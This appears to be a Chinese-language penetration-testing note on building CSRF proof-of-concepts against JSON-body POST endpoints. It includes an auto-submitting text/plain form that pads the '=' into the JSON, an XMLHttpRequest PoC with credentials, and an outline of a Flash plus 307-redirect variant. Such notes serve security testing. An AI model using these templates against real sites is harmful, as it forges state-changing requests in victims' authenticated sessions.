## JSON格式下的CSRF漏洞利用
### 介绍
GET型的CSRF一般比较简单，这里介绍POST型的CSRF漏洞的POC构造。</br>
但是在POST类型的接口或者URL中，会出现一种JSON格式的入参，构造POC有一些注意点，这里主要对此做一些记录。</br>

### 漏洞利用 
#### （一）常规POC
<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/Vulnerabilities/csrf/1.png height="300" width="650">
首先使用常规POC，可使用BurpSuite的“Engagement Tools-Generate CSRF PoC”功能生成，如下：</br>
```

<html>
<body>
	<script>history.pushState('','','/')</script>
	
	<form name="zzz" action="https://aaa.com" method="POST" enctype="text/plain">
		<input type="hidden" name='json入参' value='json入参产生“=”，此处设法闭合'/>
	</form>
	
	<script type="text/javascript">
	document.zzz.submit();
	</script>
</body>
</html>

```
使用上述常规POC会发现，响应报415，“Unsupported Media Type”，意为不支持的媒体类型;</br>
这是由于HTML文件中“enctype="text/plain"”造成的。</br>
抓包可以看到JSON入参后面跟了一个“=”符号。</br>
<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/Vulnerabilities/csrf/2.png height="300" width="650">
这种情况下，这种情况下服务端的JSON解析器可能会拒绝这段JSON，因为它不符合JSON的数据格式。 这时候我们可以给value赋值从而对=后的数据进行补全，使其构造成一个完整的json格式，可以避免解析器报错。具体的构造由name和value两个入参来进行，将"="封进JSON的入参中去，效果如下：</br>
<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/Vulnerabilities/csrf/4.png height="300" width="650">

#### （二）通过XHR提交
上述（一）最后如果还是响应415状态码，那么可能就是服务端校验了Content-Type类型，该请求字段只能为application/json。如此，可通过XHR提交入参，如下所述。</br>
在通过HTML form提交生成的POST请求中，请求头的Content-Type由<form>元素上的enctype属性指定;现在enctype只有如下三种属性值：</br>
<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/Vulnerabilities/csrf/3.png height="300" width="650">
其中text/plain可以满足JSON入参类型，但是其在用户请求时，相应请求体字段自动转换为了application/x-www-form-urlencoded。如下：</br>
<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/Vulnerabilities/csrf/5.png height="300" width="650">
当跨域影响用户数据HTTP请求(如用XMLHttpRequest发送post)时，浏览器会发送预检请求(OPTIONS请求)给服务端征求支持的请求方法，然后根据服务端响应允许才发送真正的请求。 然而如果服务端对Content-Type进行校验，则不会响应这个OPTIONS请求，从而利用失败。</br>

所以在此场景下，这一思路是行不通的。但是更多的情况下服务端可能不会校验Content-Type，或者不会严格校验Content-Type是否为application/json，所以很多情况下这是可用的。</br>
新的POC如下：</br>
```html
<html>
<body>
	<script>
		function submitRequest(){
			var xhr = new XMLHttpRequest();
			xhr.open("POST","https://aaa.com",true);
			xhr.setRequestHeader("Accept","*/*");
			xhr.setRequestHeader("Accept-Language","zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
			xhr.setRequestHeader("Content-Type","application/json");
			xhr.withCredentials = true;
			xhr.send(stringify(json入参));
		}
	</script>

	<form action="#">
		<input type="button" value="Submit Request" onclick="submitRequest();"/>
	</form>
</body>
</html>
```

#### （三）借助flash，利用307跳转实现CSRF
1.制作一个Flash文件</br>
2.制作一个跨域XML文件</br>
3.制作一个具有307状态码的php文件</br>
已经有大牛造好轮子了，参考：https://github.com/sp1d3r/swf_json_csrf</br>
